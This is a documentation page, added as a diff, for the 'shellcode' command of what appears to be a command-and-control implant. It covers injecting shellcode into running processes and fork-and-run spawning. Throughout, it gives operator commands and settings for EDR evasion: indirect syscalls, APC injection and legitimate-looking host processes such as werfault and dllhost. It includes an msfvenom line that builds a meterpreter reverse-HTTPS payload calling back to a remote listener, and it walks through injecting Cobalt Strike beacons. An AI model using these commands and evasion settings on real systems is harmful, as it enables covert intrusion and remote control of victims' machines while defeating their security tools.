@@ -1,0 +1,340 @@
+---
+title: shellcode
+description: Inject raw shellcode into remote processes or spawn new processes for execution
+---
+
+## Overview
+
+The `shellcode` command provides capabilities for injecting raw shellcode into processes using either process injection (into existing processes) or fork & run (spawning new processes). Multiple injection techniques are supported with varying OPSEC profiles.
+
+## Syntax
+
+```bash
+shellcode [method] [arch] [pid|path] [arguments]
+```
+
+## Injection Methods
+
+### inject
+
+Inject shellcode into an existing process.
+
+```bash
+shellcode inject [arch] [pid] [path-to-shellcode] [arguments]
+```
+
+<ParamField path="arch" type="string" required>
+  Architecture of the shellcode:
+  - `x86` - 32-bit shellcode
+  - `x64` - 64-bit shellcode
+</ParamField>
+
+<ParamField path="pid" type="integer" required>
+  Process ID of the target process to inject into
+</ParamField>
+
+<ParamField path="path-to-shellcode" type="string" required>
+  Local path to the raw shellcode file (will be uploaded to agent)
+</ParamField>
+
+<ParamField path="arguments" type="string" optional>
+  Optional arguments to pass to the shellcode (base64 encoded)
+</ParamField>
+
+### spawn
+
+Spawn a new process and inject shellcode (fork & run).
+
+```bash
+shellcode spawn [arch] [path-to-shellcode] [arguments]
+```
+
+<ParamField path="arch" type="string" required>
+  Architecture:
+  - `x86` - Spawns 32-bit process
+  - `x64` - Spawns 64-bit process
+</ParamField>
+
+<ParamField path="path-to-shellcode" type="string" required>
+  Local path to the raw shellcode file
+</ParamField>
+
+<ParamField path="arguments" type="string" optional>
+  Optional arguments to pass to the shellcode
+</ParamField>
+
+### execute
+
+Execute shellcode directly in the current process.
+
+```bash
+shellcode execute [arch] [path-to-shellcode] [arguments]
+```
+
+<Warning>
+  Executing shellcode in-process is risky and may crash the agent if the shellcode is incompatible or malformed.
+</Warning>
+
+## Injection Techniques
+
+The injection technique can be configured using the `config` command:
+
+```bash
+config inject.technique [technique_id]
+```
+
+<Tabs>
+  <Tab title="Default (0)">
+    Uses the default injection method configured in the profile.
+    
+    **Process Flow:**
+    1. Open target process
+    2. Allocate memory (respects `config memory.alloc`)
+    3. Write shellcode
+    4. Protect memory (respects `config memory.execute`)
+    5. Create thread (respects `config inject.technique`)
+  </Tab>
+  
+  <Tab title="CreateRemoteThread (1)">
+    Uses the Windows API `CreateRemoteThread`.
+    
+    **OPSEC:**
+    - Most detected by EDR
+    - Simple and reliable
+    - Not recommended for modern environments
+  </Tab>
+  
+  <Tab title="NtCreateThreadEx (2)">
+    Uses indirect syscall to `NtCreateThreadEx`.
+    
+    **OPSEC:**
+    - Medium evasion capability
+    - Bypasses usermode hooks
+    - May be detected by kernel callbacks
+  </Tab>
+  
+  <Tab title="NtQueueApcThread (3)">
+    Uses indirect syscall to `NtQueueApcThread`.
+    
+    **OPSEC:**
+    - Higher evasion capability
+    - Requires target thread in alertable wait state
+    - May fail if no suitable threads exist
+  </Tab>
+</Tabs>
+
+## Memory Allocation Techniques
+
+Configure memory allocation method:
+
+```bash
+config memory.alloc [technique_id]
+```
+
+- `0` - `VirtualAllocEx` (Win32 API)
+- `1` - `NtAllocateVirtualMemory` (Indirect syscall)
+
+## Memory Protection Techniques
+
+Configure memory protection method:
+
+```bash
+config memory.execute [technique_id]
+```
+
+- `0` - `VirtualProtectEx` (Win32 API)
+- `1` - `NtProtectVirtualMemory` (Indirect syscall)
+
+## Return Values
+
+<ResponseField name="status" type="string">
+  Injection result:
+  - `INJECT_ERROR_SUCCESS` (0) - Injection succeeded
+  - `INJECT_ERROR_FAILED` (1) - General failure
+  - `INJECT_ERROR_INVALID_PARAM` (2) - Invalid parameters
+  - `INJECT_ERROR_PROCESS_ARCH_MISMATCH` (3) - Architecture mismatch
+</ResponseField>
+
+<ResponseField name="thread_id" type="integer">
+  Thread ID of the created thread (if successful)
+</ResponseField>
+
+## Examples
+
+### Basic Process Injection
+
+```bash
+# Find target process
+proc grep explorer
+
+# Inject x64 shellcode into explorer.exe (PID 1520)
+shellcode inject x64 1520 /path/to/beacon.bin
+```
+
+### Fork & Run with Configured Spawn Process
+
+```bash
+# Set spawn process (if not using profile default)
+config inject.spawn64 C:\Windows\System32\werfault.exe
+
+# Spawn and inject
+shellcode spawn x64 /path/to/beacon.bin
+```
+
+### Advanced Injection with Custom Technique
+
+```bash
+# Configure injection settings for maximum evasion
+config memory.alloc 1         # Use NtAllocateVirtualMemory
+config memory.execute 1       # Use NtProtectVirtualMemory  
+config inject.technique 3     # Use NtQueueApcThread
+
+# Inject shellcode
+shellcode inject x64 2048 /path/to/shellcode.bin
+```
+
+### Shellcode with Arguments
+
+```bash
+# Inject Cobalt Strike beacon with arguments
+shellcode inject x64 1520 /path/to/beacon.bin "arg1 arg2 arg3"
+```
+
+### 32-bit Injection
+
+```bash
+# Set 32-bit spawn process
+config inject.spawn32 C:\Windows\SysWOW64\werfault.exe
+
+# Inject 32-bit shellcode
+shellcode spawn x86 /path/to/shellcode32.bin
+```
+
+## OPSEC Considerations
+
+<Warning>
+  Shellcode injection is heavily monitored by EDR solutions. Use indirect syscalls and legitimate spawn processes.
+</Warning>
+
+### Process Selection
+
+**Good Injection Targets:**
+- Long-running system processes
+- Processes with legitimate network activity
+- Processes matching your shellcode architecture
+
+**Avoid:**
+- Protected processes (PPL)
+- Antivirus/EDR processes
+- System critical processes (csrss.exe, lsass.exe)
+
+### Spawn Process Selection
+
+Configure legitimate-looking spawn processes:
+
+```bash
+# Common legitimate processes
+config inject.spawn64 C:\Windows\System32\werfault.exe
+config inject.spawn64 C:\Windows\System32\dllhost.exe
+config inject.spawn64 C:\Windows\System32\svchost.exe
+```
+
+### API Call Flow
+
+Depending on configuration, the following API sequence is used:
+
+**`INJECTION_TECHNIQUE_SYSCALL` with all syscall options:**
+
+1. `CreateProcessA` (spawning only)
+2. `NtAllocateVirtualMemory*` (indirect syscall)
+3. `NtWriteVirtualMemory*` (indirect syscall)
+4. `NtProtectVirtualMemory*` (indirect syscall)
+5. `NtCreateThreadEx*` or `NtQueueApcThread*` (indirect syscall)
+6. `NtResumeThread*` (indirect syscall)
+
+**Note:** `*` indicates indirect syscall usage
+
+### Memory Permissions
+
+- Avoid RWX memory if possible (highly suspicious)
+- Use RW allocation, write shellcode, then change to RX
+- Configure with `memory.alloc` and `memory.execute`
+
+### Detection Vectors
+
+1. **Process Open**: Opening handles to inject into processes
+2. **Memory Allocation**: Allocating executable memory in remote processes
+3. **Thread Creation**: Creating threads in remote processes
+4. **Memory Permissions**: RWX memory regions
+5. **Shellcode Signatures**: Known beacon/payload signatures
+
+## Use Cases
+
+### Cobalt Strike Beacon Injection
+
+```bash
+# Generate raw beacon
+# In Cobalt Strike: Attacks -> Packages -> Windows Executable (S) -> Output: Raw
+
+# Upload to teamserver and inject
+shellcode inject x64 1520 /path/to/beacon.bin
+```
+
+### Metasploit Payload Injection
+
+```bash
+# Generate raw shellcode
+# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f raw -o payload.bin
+
+# Inject into target
+shellcode spawn x64 /path/to/payload.bin
+```
+
+### Custom Shellcode Runner
+
+```bash
+# Set up OPSEC-friendly configuration
+config memory.alloc 1
+config memory.execute 1  
+config inject.technique 3
+config inject.spawn64 C:\Windows\System32\RuntimeBroker.exe
+
+# Execute custom shellcode
+shellcode spawn x64 /path/to/custom.bin
+```
+
+## Architecture Mismatch
+
+Injecting shellcode into a process with mismatched architecture will fail:
+
+- Cannot inject x64 shellcode into x86 process
+- Cannot inject x86 shellcode into x64 process (WoW64 exception may apply)
+
+Always verify target process architecture:
+
+```bash
+proc list | grep target_process
+```
+
+## Configuration Summary
+
+```bash
+# View current injection configuration
+config show
+
+# Recommended OPSEC settings
+config memory.alloc 1              # Syscall allocation
+config memory.execute 1            # Syscall protection
+config inject.technique 3          # APC injection
+config inject.spawn64 C:\Windows\System32\dllhost.exe
+config inject.spawn32 C:\Windows\SysWOW64\dllhost.exe
+```
+
+## Notes
+
+- Shellcode files are automatically chunked for upload (max 30MB per chunk)
+- Injection respects the configured injection technique
+- Failed injections return error codes for troubleshooting
+- Always test shellcode in a lab environment first
+- Some shellcode (like Cobalt Strike beacons) may require specific arguments
+- Suspended processes created with `proc create suspended` are good injection targets
